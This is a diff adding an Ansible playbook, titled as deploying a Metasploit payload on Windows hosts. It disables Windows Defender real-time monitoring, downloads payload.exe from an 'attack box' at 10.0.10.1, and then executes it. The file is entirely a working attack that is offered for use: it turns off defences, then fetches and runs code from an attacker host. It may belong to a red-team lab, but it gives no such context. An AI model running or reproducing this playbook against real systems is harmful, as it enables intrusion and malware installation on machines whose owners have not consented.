@@ -1,0 +1,15 @@
+- name: Deploy and execute Metasploit payload on Windows
+  hosts: windows
+  gather_facts: no
+
+  tasks:
+
+    - name: Disable Windows Defender
+      win_command: powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+      ignore_errors: yes
+
+    - name: Download the payload from attack box
+      win_command: powershell -Command "Invoke-WebRequest -Uri 'http://10.0.10.1/payload.exe' -OutFile 'C:\Users\Public\payload.exe'"  
+
+    - name: Execute the payload
+      win_command: powershell -Command "Start-Process 'C:\Users\Public\payload.exe'"
